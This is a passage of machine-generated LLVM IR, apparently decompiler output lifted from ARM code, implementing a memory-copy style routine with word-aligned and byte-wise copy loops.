  store i32 %v8_174d8, i32* %r4.global-to-local, align 4
  %v9_174d8 = add i32 %v3_174d8, 8
  %v10_174d8 = inttoptr i32 %v9_174d8 to i32*
  %v11_174d8 = load i32, i32* %v10_174d8, align 4
  store i32 %v11_174d8, i32* @ip, align 4
  %v12_174d8 = add i32 %v3_174d8, 12
  %v13_174d8 = inttoptr i32 %v12_174d8 to i32*
  %v14_174d8 = load i32, i32* %v13_174d8, align 4
  store i32 %v14_174d8, i32* %lr.global-to-local, align 4
  %v15_174d8 = add i32 %v3_174d8, 16
  store i32 %v15_174d8, i32* @r1, align 4
  %v4_174dc = inttoptr i32 %v12_174c8 to i32*
  store i32 %v5_174d8, i32* %v4_174dc, align 4
  %v6_174dc = add i32 %v0_174c0, 36
  %v7_174dc = inttoptr i32 %v6_174dc to i32*
  %v8_174dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_174dc, i32* %v7_174dc, align 4
  %v9_174dc = add i32 %v0_174c0, 40
  %v10_174dc = inttoptr i32 %v9_174dc to i32*
  %v11_174dc = load i32, i32* @ip, align 4
  store i32 %v11_174dc, i32* %v10_174dc, align 4
  %v12_174dc = add i32 %v0_174c0, 44
  %v13_174dc = inttoptr i32 %v12_174dc to i32*
  %v14_174dc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_174dc, i32* %v13_174dc, align 4
  %v15_174dc = add i32 %v0_174c0, 48
  store i32 %v15_174dc, i32* @r0, align 4
  %v3_174e0 = load i32, i32* %r2.global-to-local, align 4
  %v4_174e0 = add i32 %v3_174e0, -16
  store i32 %v4_174e0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_174d4, %bb136
  %v3_174f0102111 = phi i32 [ %v15_174dc, %bb136 ], [ %v12_174c8, %dec_label_pc_174d4 ]
  %v0_174e8.pre = phi i32 [ %v4_174e0, %bb136 ], [ %v1_174cc, %dec_label_pc_174d4 ]
  %v2_174e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_174e4, i32* @r4, align 4
  br label %dec_label_pc_174e8

dec_label_pc_174e8:                               ; preds = %dec_label_pc_174b0, %bb137
  %v3_174f0101 = phi i32 [ %v0_174c094, %dec_label_pc_174b0 ], [ %v3_174f0102111, %bb137 ]
  %v0_174e8 = phi i32 [ %v1_174b0, %dec_label_pc_174b0 ], [ %v0_174e8.pre, %bb137 ]
  %v1_174e8 = add i32 %v0_174e8, 20
  store i32 %v1_174e8, i32* %r2.global-to-local, align 4
  %v3_174e8 = sub i32 0, %v0_174e8
  %v4_174e8 = and i32 %v1_174e8, %v3_174e8
  %v5_174e8 = icmp slt i32 %v4_174e8, 0
  store i1 %v5_174e8, i1* %cpsr_v.global-to-local, align 1
  %v6_174e8 = icmp slt i32 %v1_174e8, 0
  store i1 %v6_174e8, i1* %cpsr_n.global-to-local, align 1
  %v7_174e8 = icmp eq i32 %v1_174e8, 0
  store i1 %v7_174e8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_174ec

dec_label_pc_174ec:                               ; preds = %.thread115, %dec_label_pc_174e8
  %v0_174fc.pre157 = phi i32 [ %v0_174fc.pre, %.thread115 ], [ %v1_174e8, %dec_label_pc_174e8 ]
  %v3_174f0 = phi i32 [ %v3_174f099116, %.thread115 ], [ %v3_174f0101, %dec_label_pc_174e8 ]
  %v1_174f4 = phi i1 [ %v1_174f8, %.thread115 ], [ %v5_174e8, %dec_label_pc_174e8 ]
  %v0_174f4 = phi i1 [ %v0_174f8, %.thread115 ], [ %v6_174e8, %dec_label_pc_174e8 ]
  %v2_174ec = xor i1 %v1_174f4, %v0_174f4
  br i1 %v2_174ec, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_174ec
  %v3_174ec = load i32, i32* @r1, align 4
  %v4_174ec = inttoptr i32 %v3_174ec to i32*
  %v5_174ec = load i32, i32* %v4_174ec, align 4
  store i32 %v5_174ec, i32* @r3, align 4
  %v6_174ec = add i32 %v3_174ec, 4
  %v7_174ec = inttoptr i32 %v6_174ec to i32*
  %v8_174ec = load i32, i32* %v7_174ec, align 4
  store i32 %v8_174ec, i32* @ip, align 4
  %v9_174ec = add i32 %v3_174ec, 8
  %v10_174ec = inttoptr i32 %v9_174ec to i32*
  %v11_174ec = load i32, i32* %v10_174ec, align 4
  store i32 %v11_174ec, i32* %lr.global-to-local, align 4
  %v12_174ec = add i32 %v3_174ec, 12
  store i32 %v12_174ec, i32* @r1, align 4
  %v4_174f0 = inttoptr i32 %v3_174f0 to i32*
  store i32 %v5_174ec, i32* %v4_174f0, align 4
  %v6_174f0 = add i32 %v3_174f0, 4
  %v7_174f0 = inttoptr i32 %v6_174f0 to i32*
  %v8_174f0 = load i32, i32* @ip, align 4
  store i32 %v8_174f0, i32* %v7_174f0, align 4
  %v9_174f0 = add i32 %v3_174f0, 8
  %v10_174f0 = inttoptr i32 %v9_174f0 to i32*
  %v11_174f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_174f0, i32* %v10_174f0, align 4
  %v12_174f0 = add i32 %v3_174f0, 12
  store i32 %v12_174f0, i32* @r0, align 4
  %v3_174f4 = load i32, i32* %r2.global-to-local, align 4
  %v4_174f4 = add i32 %v3_174f4, -12
  store i32 %v4_174f4, i32* %r2.global-to-local, align 4
  %v6_174f4 = sub i32 11, %v3_174f4
  %v7_174f4 = and i32 %v6_174f4, %v3_174f4
  %v8_174f4 = icmp slt i32 %v7_174f4, 0
  store i1 %v8_174f4, i1* %cpsr_v.global-to-local, align 1
  %v9_174f4 = icmp slt i32 %v4_174f4, 0
  store i1 %v9_174f4, i1* %cpsr_n.global-to-local, align 1
  %v10_174f4 = icmp eq i32 %v3_174f4, 12
  store i1 %v10_174f4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_174ec, %bb138
  %v0_174fc.pre = phi i32 [ %v4_174f4, %bb138 ], [ %v0_174fc.pre157, %dec_label_pc_174ec ]
  %v3_174f099116 = phi i32 [ %v12_174f0, %bb138 ], [ %v3_174f0, %dec_label_pc_174ec ]
  %v1_174f8 = phi i1 [ %v8_174f4, %bb138 ], [ %v1_174f4, %dec_label_pc_174ec ]
  %v0_174f8 = phi i1 [ %v9_174f4, %bb138 ], [ %v0_174f4, %dec_label_pc_174ec ]
  %v2_174f8 = xor i1 %v1_174f8, %v0_174f8
  br i1 %v2_174f8, label %dec_label_pc_174fc, label %dec_label_pc_174ec

dec_label_pc_174fc:                               ; preds = %.thread115, %dec_label_pc_174a8
  %v4_1750c = phi i32 [ %v0_174c094, %dec_label_pc_174a8 ], [ %v3_174f099116, %.thread115 ]
  %v0_174fc = phi i32 [ %v1_174a8, %dec_label_pc_174a8 ], [ %v0_174fc.pre, %.thread115 ]
  %v1_174fc = add i32 %v0_174fc, 8
  store i32 %v1_174fc, i32* %r2.global-to-local, align 4
  %v3_174fc = sub i32 0, %v0_174fc
  %v4_174fc = and i32 %v1_174fc, %v3_174fc
  %v5_174fc = icmp slt i32 %v4_174fc, 0
  store i1 %v5_174fc, i1* %cpsr_v.global-to-local, align 1
  %v6_174fc = icmp slt i32 %v1_174fc, 0
  store i1 %v6_174fc, i1* %cpsr_n.global-to-local, align 1
  %v7_174fc = icmp eq i32 %v1_174fc, 0
  store i1 %v7_174fc, i1* %cpsr_z.global-to-local, align 1
  %v2_17500 = xor i1 %v6_174fc, %v5_174fc
  br i1 %v2_17500, label %bb140, label %dec_label_pc_17504

dec_label_pc_17504:                               ; preds = %dec_label_pc_174fc
  %v1_17504 = add i32 %v0_174fc, 4
  store i32 %v1_17504, i32* %r2.global-to-local, align 4
  %v3_17504 = sub i32 -5, %v0_174fc
  %v4_17504 = and i32 %v3_17504, %v1_174fc
  %v5_17504 = icmp slt i32 %v4_17504, 0
  store i1 %v5_17504, i1* %cpsr_v.global-to-local, align 1
  %v6_17504 = icmp slt i32 %v1_17504, 0
  store i1 %v6_17504, i1* %cpsr_n.global-to-local, align 1
  %v7_17504 = icmp eq i32 %v1_174fc, 4
  store i1 %v7_17504, i1* %cpsr_z.global-to-local, align 1
  %v2_17508 = xor i1 %v6_17504, %v5_17504
  %v3_17508 = load i32, i32* @r1, align 4
  %v4_17508 = inttoptr i32 %v3_17508 to i32*
  %v5_17508 = load i32, i32* %v4_17508, align 4
  store i32 %v5_17508, i32* @r3, align 4
  %v7_17508 = add i32 %v3_17508, 4
  br i1 %v2_17508, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_17504
  store i32 %v7_17508, i32* @r1, align 4
  %v5_1750c = inttoptr i32 %v4_1750c to i32*
  store i32 %v5_17508, i32* %v5_1750c, align 4
  %v6_1750c = load i32, i32* @r0, align 4
  %v7_1750c = add i32 %v6_1750c, 4
  store i32 %v7_1750c, i32* @r0, align 4
  %v0_1751c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_17504
  %v7_17510 = inttoptr i32 %v7_17508 to i32*
  %v8_17510 = load i32, i32* %v7_17510, align 4
  store i32 %v8_17510, i32* @ip, align 4
  %v9_17510 = add i32 %v3_17508, 8
  store i32 %v9_17510, i32* @r1, align 4
  %v4_17514 = inttoptr i32 %v4_1750c to i32*
  store i32 %v5_17508, i32* %v4_17514, align 4
  %v6_17514 = add i32 %v4_1750c, 4
  %v7_17514 = inttoptr i32 %v6_17514 to i32*
  %v8_17514 = load i32, i32* @ip, align 4
  store i32 %v8_17514, i32* %v7_17514, align 4
  %v9_17514 = add i32 %v4_1750c, 8
  store i32 %v9_17514, i32* @r0, align 4
  %v3_17518 = load i32, i32* %r2.global-to-local, align 4
  %v4_17518 = add i32 %v3_17518, -4
  store i32 %v4_17518, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_174fc, %bb, %dec_label_pc_176cc, %dec_label_pc_17660, %dec_label_pc_175f4, %bb139
  %v0_1751c = phi i32 [ %v0_1751c.pre, %.thread122 ], [ %v2_1756c, %.thread128 ], [ %v1_174fc, %dec_label_pc_174fc ], [ %v2_17490, %bb ], [ %v0_1751c61, %dec_label_pc_176cc ], [ %v0_1751c60, %dec_label_pc_17660 ], [ %v0_1751c59, %dec_label_pc_175f4 ], [ %v4_17518, %bb139 ]
  %v1_1751c = add i32 %v0_1751c, 4
  store i32 %v1_1751c, i32* %r2.global-to-local, align 4
  %v3_1751c = sub i32 0, %v0_1751c
  %v4_1751c = and i32 %v1_1751c, %v3_1751c
  %v5_1751c = icmp slt i32 %v4_1751c, 0
  store i1 %v5_1751c, i1* %cpsr_v.global-to-local, align 1
  %v6_1751c = icmp slt i32 %v1_1751c, 0
  store i1 %v6_1751c, i1* %cpsr_n.global-to-local, align 1
  %v7_1751c = icmp eq i32 %v1_1751c, 0
  store i1 %v7_1751c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1751c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_17524.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_17520 = load i8*, i8** %stack_var_-8, align 4
  %v4_17520 = ptrtoint i8* %v3_17520 to i32
  store i32 %v4_17520, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_17524 = phi i32 [ %v0_17524.pre, %bb140.bb142_crit_edge ], [ %v8_1748c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1751c, i32 %v0_17524)
  %v0_17528 = load i32, i32* %r2.global-to-local, align 4
  %v1_17528 = add i32 %v0_17528, -2
  %v3_17528 = sub i32 1, %v0_17528
  %v4_17528 = and i32 %v3_17528, %v0_17528
  %v5_17528 = icmp slt i32 %v4_17528, 0
  store i1 %v5_17528, i1* %cpsr_v.global-to-local, align 1
  %v6_17528 = icmp slt i32 %v1_17528, 0
  store i1 %v6_17528, i1* %cpsr_n.global-to-local, align 1
  %v7_17528 = icmp eq i32 %v0_17528, 2
  store i1 %v7_17528, i1* %cpsr_z.global-to-local, align 1
  %v0_1752c = load i32, i32* @r1, align 4
  %v1_1752c = inttoptr i32 %v0_1752c to i8*
  %v2_1752c = load i8, i8* %v1_1752c, align 1
  %v5_1752c = add i32 %v0_1752c, 1
  store i32 %v5_1752c, i32* %r1.global-to-local, align 4
  %v2_17530 = load i32, i32* @r0, align 4
  %v3_17530 = inttoptr i32 %v2_17530 to i8*
  store i8 %v2_1752c, i8* %v3_17530, align 1
  %v4_17530 = load i32, i32* @r0, align 4
  %v5_17530 = add i32 %v4_17530, 1
  store i32 %v5_17530, i32* %r0.global-to-local, align 4
  %v0_17534 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17534 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17534 = xor i1 %v0_17534, %v1_17534
  br i1 %v2_17534, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_17534 = load i32, i32* %r1.global-to-local, align 4
  %v4_17534 = inttoptr i32 %v3_17534 to i8*
  %v5_17534 = load i8, i8* %v4_17534, align 1
  %v8_17534 = add i32 %v3_17534, 1
  store i32 %v8_17534, i32* %r1.global-to-local, align 4
  %v6_17538 = inttoptr i32 %v5_17530 to i8*
  store i8 %v5_17534, i8* %v6_17538, align 1
  %v7_17538 = load i32, i32* %r0.global-to-local, align 4
  %v8_17538 = add i32 %v7_17538, 1
  store i32 %v8_17538, i32* %r0.global-to-local, align 4
  %v1_1753c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1753c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_17540 = phi i32 [ %v8_17538, %bb143 ], [ %v5_17530, %bb142 ]
  %v2_17540 = phi i1 [ %v2_1753c.pre, %bb143 ], [ %v1_17534, %bb142 ]
  %v1_17540 = phi i1 [ %v1_1753c.pre, %bb143 ], [ %v0_17534, %bb142 ]
  %v0_1753c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1753c = xor i1 %v2_17540, %v1_17540
  %v4_1753c = or i1 %v0_1753c, %v3_1753c
  br i1 %v4_1753c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1753c = load i32, i32* %r1.global-to-local, align 4
  %v6_1753c = inttoptr i32 %v5_1753c to i8*
  %v7_1753c = load i8, i8* %v6_1753c, align 1
  %v10_1753c = add i32 %v5_1753c, 1
  store i32 %v10_1753c, i32* %r1.global-to-local, align 4
  %v8_17540 = inttoptr i32 %v7_17540 to i8*
  store i8 %v7_1753c, i8* %v8_17540, align 1
  %v9_17540 = load i32, i32* %r0.global-to-local, align 4
  %v10_17540 = add i32 %v9_17540, 1
  store i32 %v10_17540, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_17544 = load i8*, i8** %stack_var_-8, align 4
  %v3_17544 = ptrtoint i8* %v2_17544 to i32
  store i32 %v3_17544, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1748c)
  %v0_1754c.pre = load i32, i32* @ip, align 4
  %v0_17554.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_17558.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1754c

dec_label_pc_1754c:                               ; preds = %dec_label_pc_17498, %.thread126
  %v2_17558 = phi i32 [ %v1_17480, %dec_label_pc_17498 ], [ %v2_17558.pre, %.thread126 ]
  %v0_17554 = phi i32 [ %v0_17480, %dec_label_pc_17498 ], [ %v0_17554.pre, %.thread126 ]
  %v0_1754c = phi i32 [ %v1_17498, %dec_label_pc_17498 ], [ %v0_1754c.pre, %.thread126 ]
  %v1_1754c = sub i32 4, %v0_1754c
  store i32 %v1_1754c, i32* @ip, align 4
  %v1_17550 = add i32 %v1_1754c, -2
  %v3_17550 = sub i32 1, %v1_1754c
  %v4_17550 = and i32 %v3_17550, %v1_1754c
  %v5_17550 = icmp slt i32 %v4_17550, 0
  store i1 %v5_17550, i1* %cpsr_v.global-to-local, align 1
  %v6_17550 = icmp slt i32 %v1_17550, 0
  store i1 %v6_17550, i1* %cpsr_n.global-to-local, align 1
  %v7_17550 = icmp eq i32 %v1_1754c, 2
  store i1 %v7_17550, i1* %cpsr_z.global-to-local, align 1
  %v1_17554 = inttoptr i32 %v0_17554 to i8*
  %v2_17554 = load i8, i8* %v1_17554, align 1
  %v3_17554 = zext i8 %v2_17554 to i32
  store i32 %v3_17554, i32* @r3, align 4
  %v5_17554 = add i32 %v0_17554, 1
  store i32 %v5_17554, i32* @r1, align 4
  %v3_17558 = inttoptr i32 %v2_17558 to i8*
  store i8 %v2_17554, i8* %v3_17558, align 1
  %v4_17558 = load i32, i32* @r0, align 4
  %v5_17558 = add i32 %v4_17558, 1
  store i32 %v5_17558, i32* @r0, align 4
  %v0_1755c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1755c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1755c = xor i1 %v0_1755c, %v1_1755c
  br i1 %v2_1755c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1754c
  %v3_1755c = load i32, i32* @r1, align 4
  %v4_1755c = inttoptr i32 %v3_1755c to i8*
  %v5_1755c = load i8, i8* %v4_1755c, align 1
  %v6_1755c = zext i8 %v5_1755c to i32
  store i32 %v6_1755c, i32* @r3, align 4
  %v8_1755c = add i32 %v3_1755c, 1
  store i32 %v8_1755c, i32* @r1, align 4
  %v6_17560 = inttoptr i32 %v5_17558 to i8*
  store i8 %v5_1755c, i8* %v6_17560, align 1
  %v7_17560 = load i32, i32* @r0, align 4
  %v8_17560 = add i32 %v7_17560, 1
  store i32 %v8_17560, i32* @r0, align 4
  %v1_17564.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17564.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1754c, %bb145
  %v7_17568 = phi i32 [ %v8_17560, %bb145 ], [ %v5_17558, %dec_label_pc_1754c ]
  %v2_17568 = phi i1 [ %v2_17564.pre, %bb145 ], [ %v1_1755c, %dec_label_pc_1754c ]
  %v1_17568 = phi i1 [ %v1_17564.pre, %bb145 ], [ %v0_1755c, %dec_label_pc_1754c ]
  %v0_17564 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17564 = xor i1 %v2_17568, %v1_17568
  %v4_17564 = or i1 %v0_17564, %v3_17564
  br i1 %v4_17564, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_17564 = load i32, i32* @r1, align 4
  %v6_17564 = inttoptr i32 %v5_17564 to i8*
  %v7_17564 = load i8, i8* %v6_17564, align 1
  %v8_17564 = zext i8 %v7_17564 to i32
  store i32 %v8_17564, i32* @r3, align 4
  %v10_17564 = add i32 %v5_17564, 1
  store i32 %v10_17564, i32* @r1, align 4
  %v8_17568 = inttoptr i32 %v7_17568 to i8*
  store i8 %v7_17564, i8* %v8_17568, align 1
  %v9_17568 = load i32, i32* @r0, align 4
  %v10_17568 = add i32 %v9_17568, 1
  store i32 %v10_17568, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1769c77 = phi i32 [ %v10_17568, %bb146 ], [ %v7_17568, %.thread127 ]
  %v0_1756c = load i32, i32* %r2.global-to-local, align 4
  %v1_1756c = load i32, i32* @ip, align 4
  %v2_1756c = sub i32 %v0_1756c, %v1_1756c
  store i32 %v2_1756c, i32* %r2.global-to-local, align 4
  %v4_1756c = xor i32 %v1_1756c, %v0_1756c
  %v5_1756c = xor i32 %v2_1756c, %v0_1756c
  %v6_1756c = and i32 %v5_1756c, %v4_1756c
  %v7_1756c = icmp slt i32 %v6_1756c, 0
  store i1 %v7_1756c, i1* %cpsr_v.global-to-local, align 1
  %v8_1756c = icmp slt i32 %v2_1756c, 0
  store i1 %v8_1756c, i1* %cpsr_n.global-to-local, align 1
  %v9_1756c = icmp eq i32 %v0_1756c, %v1_1756c
  store i1 %v9_1756c, i1* %cpsr_z.global-to-local, align 1
  %v2_17570 = xor i1 %v8_1756c, %v7_1756c
  br i1 %v2_17570, label %bb140, label %dec_label_pc_17574

dec_label_pc_17574:                               ; preds = %.thread128
  %v0_17574 = load i32, i32* @r1, align 4
  %v1_17574 = urem i32 %v0_17574, 4
  store i32 %v1_17574, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17574 = icmp eq i32 %v1_17574, 0
  store i1 %v2_17574, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_17574 to i2
  br i1 %v2_17574, label %dec_label_pc_174a8, label %dec_label_pc_1757c

dec_label_pc_1757c:                               ; preds = %dec_label_pc_174a0, %dec_label_pc_17574
  %v0_1769c76 = phi i32 [ %v1_17480, %dec_label_pc_174a0 ], [ %v0_1769c77, %dec_label_pc_17574 ]
  %v0_17604 = phi i32 [ %v2_17490, %dec_label_pc_174a0 ], [ %v2_1756c, %dec_label_pc_17574 ]
  %v0_17584.off0 = phi i2 [ %extract.t, %dec_label_pc_174a0 ], [ %extract.t131, %dec_label_pc_17574 ]
  %v0_1757c = phi i32 [ %v0_17480, %dec_label_pc_174a0 ], [ %v0_17574, %dec_label_pc_17574 ]
  %v1_1757c = and i32 %v0_1757c, -4
  store i32 %v1_1757c, i32* %r1.global-to-local, align 4
  %v1_17580 = inttoptr i32 %v1_1757c to i32*
  %v2_17580 = load i32, i32* %v1_17580, align 4
  store i32 %v2_17580, i32* %lr.global-to-local, align 4
  %v4_17580 = add i32 %v1_1757c, 4
  store i32 %v4_17580, i32* %r1.global-to-local, align 4
  %v1_175fc = add i32 %v0_17604, -12
  %v3_175fc = sub i32 11, %v0_17604
  %v4_175fc = and i32 %v3_175fc, %v0_17604
  %v5_175fc = icmp slt i32 %v4_175fc, 0
  store i1 %v5_175fc, i1* %cpsr_v.global-to-local, align 1
  %v6_175fc = icmp slt i32 %v1_175fc, 0
  store i1 %v6_175fc, i1* %cpsr_n.global-to-local, align 1
  %v7_175fc = icmp eq i32 %v0_17604, 12
  store i1 %v7_175fc, i1* %cpsr_z.global-to-local, align 1
  %v2_17600 = xor i1 %v6_175fc, %v5_175fc
  switch i2 %v0_17584.off0, label %dec_label_pc_17590 [
    i2 -1, label %dec_label_pc_17668
    i2 -2, label %dec_label_pc_175fc
  ]

dec_label_pc_17590:                               ; preds = %dec_label_pc_1757c
  br i1 %v2_17600, label %dec_label_pc_175dc, label %dec_label_pc_17598

dec_label_pc_17598:                               ; preds = %dec_label_pc_17590
  store i32 %v1_175fc, i32* %r2.global-to-local, align 4
  %v3_1759c = load i32, i32* @r4, align 4
  store i32 %v3_1759c, i32* %stack_var_-16, align 4
  %v6_1759c = load i32, i32* @r5, align 4
  store i32 %v6_1759c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_175a0

dec_label_pc_175a0:                               ; preds = %dec_label_pc_175a0.dec_label_pc_175a0_crit_edge, %dec_label_pc_17598
  %v0_175c4 = phi i32 [ %v12_175c4, %dec_label_pc_175a0.dec_label_pc_175a0_crit_edge ], [ %v0_1769c76, %dec_label_pc_17598 ]
  %v0_175a4 = phi i32 [ %v0_175a4.pre, %dec_label_pc_175a0.dec_label_pc_175a0_crit_edge ], [ %v4_17580, %dec_label_pc_17598 ]
  %v0_175a0 = phi i32 [ %v0_175a0.pre, %dec_label_pc_175a0.dec_label_pc_175a0_crit_edge ], [ %v2_17580, %dec_label_pc_17598 ]
  %v3_175a0 = udiv i32 %v0_175a0, 256
  %v1_175a4 = inttoptr i32 %v0_175a4 to i32*
  %v2_175a4 = load i32, i32* %v1_175a4, align 4
  store i32 %v2_175a4, i32* %r4.global-to-local, align 4
  %v3_175a4 = add i32 %v0_175a4, 4
  %v4_175a4 = inttoptr i32 %v3_175a4 to i32*
  %v5_175a4 = load i32, i32* %v4_175a4, align 4
  store i32 %v5_175a4, i32* %r5.global-to-local, align 4
  %v6_175a4 = add i32 %v0_175a4, 8
  %v7_175a4 = inttoptr i32 %v6_175a4 to i32*
  %v8_175a4 = load i32, i32* %v7_175a4, align 4
  store i32 %v8_175a4, i32* %ip.global-to-local, align 4
  %v9_175a4 = add i32 %v0_175a4, 12
  %v10_175a4 = inttoptr i32 %v9_175a4 to i32*
  %v11_175a4 = load i32, i32* %v10_175a4, align 4
  store i32 %v11_175a4, i32* %lr.global-to-local, align 4
  %v12_175a4 = add i32 %v0_175a4, 16
  store i32 %v12_175a4, i32* %r1.global-to-local, align 4
  %v4_175a8 = mul i32 %v2_175a4, 16777216
  %v5_175a8 = or i32 %v4_175a8, %v3_175a0
  store i32 %v5_175a8, i32* @r3, align 4
  %v3_175ac = udiv i32 %v2_175a4, 256
  %v4_175b0 = mul i32 %v5_175a4, 16777216
  %v5_175b0 = or i32 %v4_175b0, %v3_175ac
  store i32 %v5_175b0, i32* %r4.global-to-local, align 4
  %v3_175b4 = udiv i32 %v5_175a4, 256
  %v4_175b8 = mul i32 %v8_175a4, 16777216
  %v5_175b8 = or i32 %v4_175b8, %v3_175b4
  store i32 %v5_175b8, i32* %r5.global-to-local, align 4
  %v3_175bc = udiv i32 %v8_175a4, 256
  %v4_175c0 = mul i32 %v11_175a4, 16777216
  %v5_175c0 = or i32 %v4_175c0, %v3_175bc
  store i32 %v5_175c0, i32* @ip, align 4
  %v1_175c4 = inttoptr i32 %v0_175c4 to i32*
  store i32 %v5_175a8, i32* %v1_175c4, align 4
  %v3_175c4 = add i32 %v0_175c4, 4
  %v4_175c4 = inttoptr i32 %v3_175c4 to i32*
  %v5_175c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_175c4, i32* %v4_175c4, align 4
  %v6_175c4 = add i32 %v0_175c4, 8
  %v7_175c4 = inttoptr i32 %v6_175c4 to i32*
  %v8_175c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_175c4, i32* %v7_175c4, align 4
  %v9_175c4 = add i32 %v0_175c4, 12
  %v10_175c4 = inttoptr i32 %v9_175c4 to i32*
  %v11_175c4 = load i32, i32* @ip, align 4
  store i32 %v11_175c4, i32* %v10_175c4, align 4
  %v12_175c4 = add i32 %v0_175c4, 16
  store i32 %v12_175c4, i32* @r0, align 4
  %v0_175c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_175c8 = add i32 %v0_175c8, -16
  store i32 %v1_175c8, i32* %r2.global-to-local, align 4
  %v3_175c8 = sub i32 15, %v0_175c8
  %v4_175c8 = and i32 %v3_175c8, %v0_175c8
  %v5_175c8 = icmp slt i32 %v4_175c8, 0
  %v6_175c8 = icmp slt i32 %v1_175c8, 0
  %v2_175cc = xor i1 %v6_175c8, %v5_175c8
  br i1 %v2_175cc, label %dec_label_pc_175d0, label %dec_label_pc_175a0.dec_label_pc_175a0_crit_edge

dec_label_pc_175a0.dec_label_pc_175a0_crit_edge:  ; preds = %dec_label_pc_175a0
  %v0_175a0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_175a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_175a0

dec_label_pc_175d0:                               ; preds = %dec_label_pc_175a0
  %v2_175d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_175d0, i32* @r4, align 4
  %v5_175d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_175d0, i32* @r5, align 4
  %v1_175d4 = add i32 %v0_175c8, -4
  store i32 %v1_175d4, i32* %r2.global-to-local, align 4
  %v3_175d4 = add i32 %v0_175c8, 2147483632
  %v4_175d4 = and i32 %v1_175d4, %v3_175d4
  %v5_175d4 = icmp slt i32 %v4_175d4, 0
  store i1 %v5_175d4, i1* %cpsr_v.global-to-local, align 1
  %v6_175d4 = icmp slt i32 %v1_175d4, 0
  store i1 %v6_175d4, i1* %cpsr_n.global-to-local, align 1
  %v7_175d4 = icmp eq i32 %v1_175d4, 0
  store i1 %v7_175d4, i1* %cpsr_z.global-to-local, align 1
  %v2_175d8 = xor i1 %v6_175d4, %v5_175d4
  br i1 %v2_175d8, label %dec_label_pc_175f4, label %dec_label_pc_175dc

dec_label_pc_175dc:                               ; preds = %dec_label_pc_175d0, %dec_label_pc_17590, %dec_label_pc_175dc
  %v1_175e8 = phi i32 [ %v4_175e8, %dec_label_pc_175dc ], [ %v12_175c4, %dec_label_pc_175d0 ], [ %v0_1769c76, %dec_label_pc_17590 ]
  %v0_175dc = load i32, i32* %lr.global-to-local, align 4
  %v3_175dc = udiv i32 %v0_175dc, 256
  store i32 %v3_175dc, i32* %ip.global-to-local, align 4
  %v0_175e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_175e0 = inttoptr i32 %v0_175e0 to i32*
  %v2_175e0 = load i32, i32* %v1_175e0, align 4
  store i32 %v2_175e0, i32* %lr.global-to-local, align 4
  %v4_175e0 = add i32 %v0_175e0, 4
  store i32 %v4_175e0, i32* %r1.global-to-local, align 4
  %v4_175e4 = mul i32 %v2_175e0, 16777216
  %v5_175e4 = or i32 %v4_175e4, %v3_175dc
  store i32 %v5_175e4, i32* @ip, align 4
  %v2_175e8 = inttoptr i32 %v1_175e8 to i32*
  store i32 %v5_175e4, i32* %v2_175e8, align 4
  %v3_175e8 = load i32, i32* @r0, align 4
  %v4_175e8 = add i32 %v3_175e8, 4
  store i32 %v4_175e8, i32* @r0, align 4
  %v0_175ec = load i32, i32* %r2.global-to-local, align 4
  %v1_175ec = add i32 %v0_175ec, -4
  store i32 %v1_175ec, i32* %r2.global-to-local, align 4
  %v3_175ec = sub i32 3, %v0_175ec
  %v4_175ec = and i32 %v3_175ec, %v0_175ec
  %v5_175ec = icmp slt i32 %v4_175ec, 0
